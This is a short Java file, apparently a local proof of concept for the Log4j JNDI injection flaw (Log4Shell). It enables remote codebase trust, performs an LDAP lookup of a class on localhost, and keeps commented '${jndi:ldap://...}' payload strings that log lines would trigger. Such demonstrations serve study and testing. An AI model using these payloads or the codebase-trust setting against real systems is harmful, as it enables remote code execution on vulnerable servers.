package com.kirelcodes.log4j;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;

public class Client {
	static final Logger logger = LogManager.getLogger(Client.class.getName());

	public static void main(String[] args) throws NamingException {
		System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase","true");
		Context ctx = new InitialContext();
		Object var4 = ctx.lookup("ldap://127.0.0.1:8081/OpenCalculatorExample");
//		Object var4 = ctx.lookup("ldap://127.0.0.1:8081/OpenCalculatorExample_2.OpenCalculatorExample_2");
//    logger.error("${jndi:ldap://127.0.0.1:8081/OpenCalculatorExample}");
//    logger.error("${jndi:ldap://127.0.0.1:8080/CreateFileExample.class}");

		logger.error("Heyy");
	}
}